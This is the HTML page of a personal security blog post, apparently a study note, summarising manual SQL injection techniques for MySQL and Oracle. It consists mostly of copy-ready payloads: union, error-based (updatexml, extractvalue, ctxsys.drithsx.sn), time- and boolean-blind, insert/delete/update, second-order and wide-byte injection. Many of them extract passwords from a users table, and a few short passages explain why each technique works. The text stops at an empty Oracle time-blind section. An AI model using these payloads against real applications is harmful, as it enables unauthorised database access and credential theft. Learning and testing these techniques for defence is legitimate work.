@@ -1,0 +1,804 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>SQL手工注入总结 | Hexo</title>
+  <meta name="keywords" content=" SQL注入 ">
+  <meta name="description" content="SQL手工注入总结 | Hexo">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="description" content="FastjsonFastjson姿势技巧集合 说明持续更新，手工yyds。 探测用来探测目标版本，才能更好确定使用的payload。还可以用来区分fastjson和Jackjson。fastjson探测版本，还可以用错误格式的json发过去。如果对方异常未处理可报出详细版本。    主要是利用各个类被加入黑名单的方式进行判断 fastjson &gt;1.2.43 &amp;#123;&quot;@typ">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Fastjson系列总结">
+<meta property="og:url" content="http://example.com/2021/08/31/Fastjson%E7%B3%BB%E5%88%97%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="FastjsonFastjson姿势技巧集合 说明持续更新，手工yyds。 探测用来探测目标版本，才能更好确定使用的payload。还可以用来区分fastjson和Jackjson。fastjson探测版本，还可以用错误格式的json发过去。如果对方异常未处理可报出详细版本。    主要是利用各个类被加入黑名单的方式进行判断 fastjson &gt;1.2.43 &amp;#123;&quot;@typ">
+<meta property="og:locale">
+<meta property="article:published_time" content="2021-08-31T05:48:04.000Z">
+<meta property="article:modified_time" content="2021-08-31T07:17:48.168Z">
+<meta property="article:author" content="Alex">
+<meta property="article:tag" content="Fastjson">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="icon" href="/img/avatar.jpg">
+
+<link href="/css/style.css?v=1.1.0" rel="stylesheet">
+
+<link href="/css/hl_theme/github.css?v=1.1.0" rel="stylesheet">
+
+<link href="//cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" rel="stylesheet">
+
+<script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+<script src="/js/titleTip.js?v=1.1.0" ></script>
+
+<script src="//cdn.jsdelivr.net/npm/highlightjs@9.16.2/highlight.pack.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/jquery.cookie@1.4.1/jquery.cookie.min.js" ></script>
+
+<script src="/js/iconfont.js?v=1.1.0" ></script>
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="">
+  <input class="theme_blog_path" value="">
+  <input id="theme_shortcut" value="true" />
+  <input id="theme_highlight_on" value="true" />
+  <input id="theme_code_copy" value="true" />
+</div>
+
+
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/"
+   class="avatar_target">
+    <img class="avatar"
+         src="/img/avatar.jpg"/>
+</a>
+<div class="author">
+    <span>Alex</span>
+</div>
+
+<div class="icon">
+    
+        
+            <a title="rss"
+               href="/atom.xml"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-rss"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="github"
+               href="https://github.com/SwagXz"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-github"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="email"
+               href="mailto:1824582879@qq.com"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-email"></use>
+                    </svg>
+                
+            </a>
+        
+    
+</div>
+
+
+
+
+<ul>
+    <li>
+        <div class="all active" data-rel="All">All
+            
+                <small>(14)</small>
+            
+        </div>
+    </li>
+    
+        
+            
+                <li>
+                    <div data-rel="基础知识">
+                        
+                        基础知识
+                        <small>(4)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+        
+            
+                <li>
+                    <div data-rel="域渗透">
+                        
+                        域渗透
+                        <small>(1)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+        
+            
+            
+            
+    </div>
+    <div>
+        
+        <a 
+                                           class="friends">Friends</a>
+        
+    </div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="14">
+<input type="hidden" id="yelog_site_word_count" value="24.1k">
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        Links
+        <i class="iconfont icon-left"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="http://yelog.org/">叶落阁</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <div class="right-top">
+        <div id="default-panel">
+            <i class="iconfont icon-search" data-title="搜索 快捷键 i"></i>
+            <div class="right-title">All</div>
+            <i class="iconfont icon-file-tree" data-title="切换到大纲视图 快捷键 w"></i>
+        </div>
+        <div id="search-panel">
+            <i class="iconfont icon-left" data-title="返回"></i>
+            <input id="local-search-input" autocomplete="off"/>
+            <label class="border-line" for="input"></label>
+            <i class="iconfont icon-case-sensitive" data-title="大小写敏感"></i>
+            <i class="iconfont icon-tag" data-title="标签"></i>
+        </div>
+        <div id="outline-panel" style="display: none">
+            <div class="right-title">大纲</div>
+            <i class="iconfont icon-list" data-title="切换到文章列表"></i>
+        </div>
+    </div>
+
+    <div class="tags-list">
+    <input id="tag-search" />
+    <div class="tag-wrapper">
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>工具</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>漏洞复现</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>逻辑漏洞</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>内网</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>修复建议</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>应急响应</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>域渗透</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>Fastjson</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>Hexo</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>Python</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>Redis</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>SQL注入</a>
+            </li>
+        
+    </div>
+
+</div>
+
+    
+    <div id="local-search-result">
+
+    </div>
+    
+    <nav id="title-list-nav">
+        
+        <a  class="All "
+           href="/2021/08/31/Fastjson%E7%B3%BB%E5%88%97%E6%80%BB%E7%BB%93/"
+           data-tag="Fastjson"
+           data-author="" >
+            <span class="post-title" title="Fastjson系列总结">Fastjson系列总结</span>
+            <span class="post-date" title="2021-08-31 13:48:04">2021/08/31</span>
+        </a>
+        
+        <a  class="All "
+           href="/2021/01/08/CVE-2020-15148Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/"
+           data-tag="漏洞复现"
+           data-author="" >
+            <span class="post-title" title="CVE-2020-15148Yii2反序列化RCE分析与复现">CVE-2020-15148Yii2反序列化RCE分析与复现</span>
+            <span class="post-date" title="2021-01-08 18:21:18">2021/01/08</span>
+        </a>
+        
+        <a  class="All "
+           href="/2020/12/31/SMBGhost%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"
+           data-tag="漏洞复现"
+           data-author="" >
+            <span class="post-title" title="SMBGhost命令执行漏洞">SMBGhost命令执行漏洞</span>
+            <span class="post-date" title="2020-12-31 13:55:33">2020/12/31</span>
+        </a>
+        
+        <a  class="All "
+           href="/2020/11/19/CVE2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"
+           data-tag="漏洞复现"
+           data-author="" >
+            <span class="post-title" title="CVE2020-1472漏洞复现">CVE2020-1472漏洞复现</span>
+            <span class="post-date" title="2020-11-19 17:31:29">2020/11/19</span>
+        </a>
+        
+        <a  class="All "
+           href="/2020/11/15/%E5%9F%BA%E4%BA%8E%E7%BB%BF%E7%9B%9F%E4%B8%8ENessus%E5%8E%9F%E5%A7%8B%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%BF%AB%E9%80%9F%E5%A4%84%E7%90%86/"
+           data-tag="Python"
+           data-author="" >
+            <span class="post-title" title="基于绿盟与Nessus原始漏洞的快速处理">基于绿盟与Nessus原始漏洞的快速处理</span>
+            <span class="post-date" title="2020-11-15 20:46:32">2020/11/15</span>
+        </a>
+        
+        <a  class="All 基础知识 "
+           href="/2020/08/11/SQL%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"
+           data-tag="SQL注入"
+           data-author="" >
+            <span class="post-title" title="SQL手工注入总结">SQL手工注入总结</span>
+            <span class="post-date" title="2020-08-11 10:58:58">2020/08/11</span>
+        </a>
+        
+        <a  class="All 基础知识 "
+           href="/2020/07/29/%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"
+           data-tag="修复建议"
+           data-author="" >
+            <span class="post-title" title="修复方式总结">修复方式总结</span>
+            <span class="post-date" title="2020-07-29 09:49:17">2020/07/29</span>
+        </a>
+        
+        <a  class="All 域渗透 "
+           href="/2020/07/06/Kerberos%20%E5%8D%8F%E8%AE%AE/"
+           data-tag="域渗透,内网"
+           data-author="" >
+            <span class="post-title" title="Kerberos 协议">Kerberos 协议</span>
+            <span class="post-date" title="2020-07-06 10:25:07">2020/07/06</span>
+        </a>
+        
+        <a  class="All "
+           href="/2020/06/20/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/"
+           data-tag="Redis"
+           data-author="" >
+            <span class="post-title" title="Redis未授权访问总结">Redis未授权访问总结</span>
+            <span class="post-date" title="2020-06-20 11:25:11">2020/06/20</span>
+        </a>
+        
+        <a  class="All 基础知识 "
+           href="/2020/05/12/SQL%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/"
+           data-tag="SQL注入"
+           data-author="" >
+            <span class="post-title" title="SQL基础知识总结">SQL基础知识总结</span>
+            <span class="post-date" title="2020-05-12 10:42:50">2020/05/12</span>
+        </a>
+        
+        <a  class="All "
+           href="/2020/04/15/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%84%91%E5%9B%BE/"
+           data-tag="应急响应"
+           data-author="" >
+            <span class="post-title" title="应急响应脑图">应急响应脑图</span>
+            <span class="post-date" title="2020-04-15 10:20:57">2020/04/15</span>
+        </a>
+        
+        <a  class="All "
+           href="/2020/03/16/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB/"
+           data-tag="工具"
+           data-author="" >
+            <span class="post-title" title="常用工具汇总">常用工具汇总</span>
+            <span class="post-date" title="2020-03-16 10:45:47">2020/03/16</span>
+        </a>
+        
+        <a  class="All 基础知识 "
+           href="/2020/02/07/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"
+           data-tag="逻辑漏洞"
+           data-author="" >
+            <span class="post-title" title="逻辑漏洞总结">逻辑漏洞总结</span>
+            <span class="post-date" title="2020-02-07 08:36:28">2020/02/07</span>
+        </a>
+        
+        <a  class="All "
+           href="/2020/02/05/Hexo%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/"
+           data-tag="Hexo"
+           data-author="" >
+            <span class="post-title" title="Hexo基本操作">Hexo基本操作</span>
+            <span class="post-date" title="2020-02-05 13:18:26">2020/02/05</span>
+        </a>
+        
+        <div id="no-item-tips">
+
+        </div>
+    </nav>
+    <div id="outline-list">
+    </div>
+</div>
+
+    </div>
+    <div class="hide-list">
+        <div class="semicircle" data-title="切换全屏 快捷键 s">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div id="post">
+    <div class="pjax">
+        <article id="post-SQL手工注入总结" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">SQL手工注入总结</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            <i class="iconfont icon-category"></i>
+            
+            
+            <a  data-rel="基础知识">基础知识</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            <i class="iconfont icon-tag"></i>
+            
+            <a class="color1">SQL注入</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+            Created At : <time class="date" title='Updated At: 2020-08-31 18:48:56'>2020-08-11 10:58</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        <span>Count:2.6k</span>
+        
+        
+        <span id="busuanzi_container_page_pv">
+            Views 👀 :<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-Mysql-%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5"><span class="toc-text">0x01 Mysql 手工注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-text">1.1 联合注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-3-%E7%9B%B2%E6%B3%A8"><span class="toc-text">1.3 盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-3-1-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-text">1.3.1 时间盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-3-2-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-text">1.3.2 布尔盲注</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-4-insert-delete-update"><span class="toc-text">1.4 insert,delete,update</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-4-1-%E6%8A%A5%E9%94%99"><span class="toc-text">1.4.1 报错</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-4-2-%E7%9B%B2%E6%B3%A8"><span class="toc-text">1.4.2 盲注</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-5-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%E4%B8%8E%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-text">1.5 二次注入与宽字节注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Oracle-%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5"><span class="toc-text">0x02 Oracle 手工注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-text">2.1 联合注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">2.2 报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-1-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-text">2.3.1 布尔盲注</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-SQL-server-%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5"><span class="toc-text">0x03 SQL server 手工注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-text">3.1 联合注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">3.2 报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-%E7%9B%B2%E6%B3%A8"><span class="toc-text">3.3 盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-3-1-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-text">3.3.1 布尔盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-3-2-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-text">3.3.2 时间盲注</span></a></li></ol></li></ol></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="0x01-Mysql-手工注入"><a href="#0x01-Mysql-手工注入" class="headerlink" title="0x01 Mysql 手工注入"></a>0x01 Mysql 手工注入</h2><h3 id="1-1-联合注入"><a href="#1-1-联合注入" class="headerlink" title="1.1 联合注入"></a>1.1 联合注入</h3><pre><code>?id=1&#39; order by 4--+?id=0&#39; union select 1,2,3,database()--+
+?id=0&#39; union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database() --+
+?id=0&#39; union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot; --+
+#group_concat(column_name) 可替换为 unhex(Hex(cast(column_name+as+char)))column_name
+?id=0&#39; union select 1,2,3,group_concat(password) from users --+#group_concat 可替换为 concat_ws(&#39;,&#39;,id,users,password )
+?id=0&#39; union select 1,2,3,password from users limit 0,1--+
+</code></pre>
+<p><strong>1.2 报错注入</strong></p>
+<pre><code>1.floor()select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);
+2.extractvalue()select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));
+3.updatexml()select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));
+4.geometrycollection()select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));
+5.multipoint()select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));
+6.polygon()select * from test where id=1 and polygon((select * from(select * from(select user())a)b));
+7.multipolygon()select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));
+8.linestring()select * from test where id=1 and linestring((select * from(select * from(select user())a)b));
+9.multilinestring()select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));
+10.exp()select * from test where id=1 and exp(~(select * from(select user())a));
+</code></pre>
+<p>每个一个报错语句都有它的原理：</p>
+<p>exp() 报错的原理：exp 是一个数学函数，取e的x次方，当我们输入的值大于709就会报错，然后 ~ 取反它的值总会大于709，所以报错。</p>
+<p>updatexml() 报错的原理：由于 updatexml 的第二个参数需要 Xpath 格式的字符串，以 ~ 开头的内容不是 xml 格式的语法，concat() 函数为字符串连接函数显然不符合规则，但是会将括号内的执行结果以错误的形式报出，这样就可以实现报错注入了。</p>
+<pre><code>爆库：?id=1&#39; and updatexml(1,(select concat(0x7e,(schema_name),0x7e) from information_schema.schemata limit 2,1),1) -- +
+爆表：?id=1&#39; and updatexml(1,(select concat(0x7e,(table_name),0x7e) from information_schema.tables where table_schema=&#39;security&#39; limit 3,1),1) -- +
+爆字段：?id=1&#39; and updatexml(1,(select concat(0x7e,(column_name),0x7e) from information_schema.columns where table_name=0x7573657273 limit 2,1),1) -- +
+爆数据：?id=1&#39; and updatexml(1,(select concat(0x7e,password,0x7e) from users limit 1,1),1) -- +
+#concat 也可以放在外面 updatexml(1,concat(0x7e,(select password from users limit 1,1),0x7e),1)
+</code></pre>
+<p>这里需要注意的是它加了连接字符，导致数据中的 md5 只能爆出 31 位，这里可以用分割函数分割出来：</p>
+<pre><code>substr(string string,num start,num length);
+#string为字符串,start为起始位置,length为长度
+?id=1&#39; and updatexml(1,concat(0x7e, substr((select password from users limit 1,1),1,16),0x7e),1) -- +
+</code></pre>
+<h4 id="1-3-盲注"><a href="#1-3-盲注" class="headerlink" title="1.3 盲注"></a>1.3 盲注</h4><h4 id="1-3-1-时间盲注"><a href="#1-3-1-时间盲注" class="headerlink" title="1.3.1 时间盲注"></a>1.3.1 时间盲注</h4><p>时间盲注也叫延时注入 一般用到函数 sleep() BENCHMARK() 还可以使用笛卡尔积(尽量不要使用,内容太多会很慢很慢)</p>
+<p>一般时间盲注我们还需要使用条件判断函数</p>
+<pre><code>#if（expre1，expre2，expre3）当 expre1 为 true 时，返回 expre2，false 时，返回 expre3
+#盲注的同时也配合着 mysql 提供的分割函substr、substring、left
+</code></pre>
+<p>我们一般喜欢把分割的函数编码一下，当然不编码也行，编码的好处就是可以不用引号，常用到的就有 ascii() hex() 等等</p>
+<pre><code>?id=1&#39; and if(ascii(substr(database(),1,1))&gt;115,1,sleep(5))--+?id=1&#39; and if((substr((select user()),1,1)=&#39;r&#39;),sleep(5),1)--+
+</code></pre>
+<h4 id="1-3-2-布尔盲注"><a href="#1-3-2-布尔盲注" class="headerlink" title="1.3.2 布尔盲注"></a><strong>1.3.2 布尔盲注</strong></h4><pre><code>?id=1&#39; and substr((select user()),1,1)=&#39;r&#39; -- +?id=1&#39; and IFNULL((substr((select user()),1,1)=&#39;r&#39;),0) -- +
+#如果 IFNULL 第一个参数的表达式为 NULL，则返回第二个参数的备用值，不为 Null 则输出值
+?id=1&#39; and strcmp((substr((select user()),1,1)=&#39;r&#39;),1) -- +
+#若所有的字符串均相同，STRCMP() 返回 0，若根据当前分类次序，第一个参数小于第二个，则返回 -1 ，其它情况返回 1
+</code></pre>
+<h3 id="1-4-insert-delete-update"><a href="#1-4-insert-delete-update" class="headerlink" title="1.4 insert,delete,update"></a>1.4 insert,delete,update</h3><p>insert,delete,update 主要是用到盲注和报错注入，此类注入点不建议使用 sqlmap 等工具，会造成大量垃圾数据，一般这种注入会出现在 注册、ip头、留言板等等需要写入数据的地方,同时这种注入不报错一般较难发现，我们可以尝试性插入、引号、双引号、转义符 \ 让语句不能正常执行，然后如果插入失败，更新失败，然后深入测试确定是否存在注入</p>
+<h4 id="1-4-1-报错"><a href="#1-4-1-报错" class="headerlink" title="1.4.1 报错"></a>1.4.1 报错</h4><pre><code>mysql&gt; insert into admin (id,username,password) values (2,&quot;or updatexml(1,concat(0x7e,(version())),0) or&quot;,&quot;admin&quot;);Query OK, 1 row affected (0.00 sec)
+mysql&gt; select * from admin;
++------+-----------------------------------------------+----------+
+| id   | username                                      | password 
+|+------+-----------------------------------------------+----------+
+|    1 | admin                                         | admin    |
+|    1 | and 1=1                                       | admin    |
+|    2 | or updatexml(1,concat(0x7e,(version())),0) or | admin    |
++------+-----------------------------------------------+----------+
+3 rows in set (0.00 sec)
+mysql&gt; insert into admin (id,username,password) values (2,&quot;&quot;or updat
+exml(1,concat(0x7e,(version())),0) or&quot;&quot;,&quot;admin&quot;);ERROR 1105 (HY000):
+ XPATH syntax error: &#39;~5.5.53&#39;
+#delete 注入很危险，很危险，很危险，切记不能使用 or 1=1 ，or 右边一定要为falsemysql&gt; delete from admin where id =-2 or updatexml(1,concat(0x7e,(version())),0);ERROR 1105 (HY000): XPATH syntax error: &#39;~5.5.53&#39;
+</code></pre>
+<h4 id="1-4-2-盲注"><a href="#1-4-2-盲注" class="headerlink" title="1.4.2 盲注"></a>1.4.2 盲注</h4><pre><code>#int型 可以使用 运算符 比如 加减乘除 and or 异或 移位等等
+mysql&gt; insert into admin values (2+if((substr((select user()),1,1)=&#39;r&#39;),sleep(5),1),&#39;1&#39;,&quot;admin&quot;);
+Query OK, 1 row affected (5.00 sec)
+mysql&gt; insert into admin values (2+if((substr((select user()),1,1)=&#39;p&#39;),sleep(5),1),&#39;1&#39;,&quot;admin&quot;);
+Query OK, 1 row affected (0.00 sec)
+#字符型注意闭合不能使用and
+mysql&gt; insert into admin values (2,&#39;&#39;+if((substr((select user()),1,1)=&#39;p&#39;),sleep(5),1)+&#39;&#39;,&quot;admin&quot;);
+Query OK, 1 row affected (0.00 sec)
+mysql&gt; insert into admin values (2,&#39;&#39;+if((substr((select user()),1,1)=&#39;r&#39;),sleep(5),1)+&#39;&#39;,&quot;admin&quot;);
+Query OK, 1 row affected (5.01 sec)
+# delete 函数 or 右边一定要为 false
+mysql&gt; delete from admin where id =-2 or if((substr((select user()),1,1)=&#39;r4&#39;),sleep(5),0);Query OK, 0 rows affected (0.00 sec)
+mysql&gt; delete from admin where id =-2 or if((substr((select user()),1,1)=&#39;r&#39;),sleep(5),0);
+Query OK, 0 rows affected (5.00 sec)
+#update 更新数据内容
+mysql&gt; select * from admin;
++------+----------+----------+
+| id   | username | password |
++------+----------+----------+
+|    2 | 1        | admin    |
+|    2 | 1        | admin    |
+|    2 | 1        | admin    |
+|    2 | admin    | admin    |
++------+----------+----------+
+4 rows in set (0.00 sec)
+mysql&gt; update admin set id=&quot;5&quot;+sleep(5)+&quot;&quot; where id=2;
+Query OK, 4 rows affected (20.00 sec)Rows matched: 4  Changed: 4  Warnings: 0
+</code></pre>
+<h3 id="1-5-二次注入与宽字节注入"><a href="#1-5-二次注入与宽字节注入" class="headerlink" title="1.5 二次注入与宽字节注入"></a>1.5 二次注入与宽字节注入</h3><p>二次注入的语句：在没有被单引号包裹的sql语句下，我们可以用16进制编码他，这样就不会带有单引号等。</p>
+<pre><code>mysql&gt; insert into admin (id,name,pass) values (&#39;3&#39;,0x61646d696e272d2d2b,&#39;11&#39;);
+Query OK, 1 row affected (0.00 sec)
+mysql&gt; select * from admin;+----+-----------+-------+
+| id | name      | pass  |+----+-----------+-------+
+|  1 | admin     | admin ||  2 | admin&#39;111 | 11111 |
+|  3 | admin&#39;--+ | 11    |+----+-----------+-------+
+4 rows in set (0.00 sec)
+</code></pre>
+<p>二次注入在没有源码的情况比较难发现，通常见于注册，登录恶意账户后，数据库可能会因为恶意账户名的问题，将 admin’–+ 误认为 admin 账户</p>
+<p>宽字节注入：针对目标做了一定的防护，单引号转变为 <code>\&#39;</code> , mysql 会将 <code>\</code> 编码为 <code>%5c</code> ，宽字节中两个字节代表一个汉字，所以把 <code>%df</code> 加上 <code>%5c</code> 就变成了一个汉字“運”，使用这种方法成功绕过转义，就是所谓的宽字节注入</p>
+<pre><code>id=-1%df&#39; union select...
+#没使用宽字节%27 -&gt; %5C%27
+#使用宽字节%df%27 -&gt; %df%5c%27 -&gt; 運&#39;
+</code></pre>
+<h2 id="0x02-Oracle-手工注入"><a href="#0x02-Oracle-手工注入" class="headerlink" title="0x02 Oracle 手工注入"></a>0x02 Oracle 手工注入</h2><h3 id="2-1-联合注入"><a href="#2-1-联合注入" class="headerlink" title="2.1 联合注入"></a>2.1 联合注入</h3><pre><code>?id=-1&#39; union select user,null from dual--
+?id=-1&#39; union select version,null from v$instance--
+?id=-1&#39; union select table_name,null from (select * from (select rownum as limit,table_name from user_tables) where limit=3)--
+?id=-1&#39; union select column_name,null from (select * from (select rownum as limit,column_name from user_tab_columns where table_name =&#39;USERS&#39;) where limit=2)--
+?id=-1&#39; union select username,passwd from users--
+?id=-1&#39; union select username,passwd from (select * from (select username,passwd,rownum as limit from users) where limit=3)--
+</code></pre>
+<h3 id="2-2-报错注入"><a href="#2-2-报错注入" class="headerlink" title="2.2 报错注入"></a>2.2 报错注入</h3><pre><code>?id=1&#39; and 1=ctxsys.drithsx.sn(1,(select user from dual))--?
+id=1&#39; and 1=ctxsys.drithsx.sn(1,(select banner from v$version where banner like &#39;Oracle%))--?
+id=1&#39; and 1=ctxsys.drithsx.sn(1,(select table_name from (select rownum as limit,table_name from user_tables) where limit= 3))--?
+id=1&#39; and 1=ctxsys.drithsx.sn(1,(select column_name from (select rownum as limit,column_name from user_tab_columns where table_name =&#39;USERS&#39;) where limit=3))--
+?id=1&#39; and 1=ctxsys.drithsx.sn(1,(select passwd from (select passwd,rownum as limit from users) where limit=1))--
+</code></pre>
+<p>2.3 盲注</p>
+<h4 id="2-3-1-布尔盲注"><a href="#2-3-1-布尔盲注" class="headerlink" title="2.3.1 布尔盲注"></a>2.3.1 布尔盲注</h4><p>既然是盲注，那么肯定涉及到条件判断语句，Oracle除了使用IF the else end if这种复杂的，还可以使用 decode() 函数。<br>语法：decode(条件,值1,返回值1,值2,返回值2,…值n,返回值n,缺省值);</p>
+<p>该函数的含义如下：</p>
+<pre><code>IF 条件=值1 THEN
+　　　　RETURN(返回值1)
+ELSIF 条件=值2 THEN
+　　　　RETURN(返回值2)
+　　　　......
+ELSIF 条件=值n THEN
+　　　　RETURN(返回值n)
+ELSE　　　　
+    RETURN(缺省值)
+END IF
+</code></pre>
+<pre><code>?id=1&#39; and 1=(select decode(user,&#39;SYSTEM&#39;,1,0,0) from dual)--
+?id=1&#39; and 1=(select decode(substr(user,1,1),&#39;S&#39;,1,0,0) from dual)--
+?id=1&#39; and ascii(substr(user,1,1))&gt; 64--  #二分法
+</code></pre>
+<p><strong>2.3.2 时间盲注</strong></p>
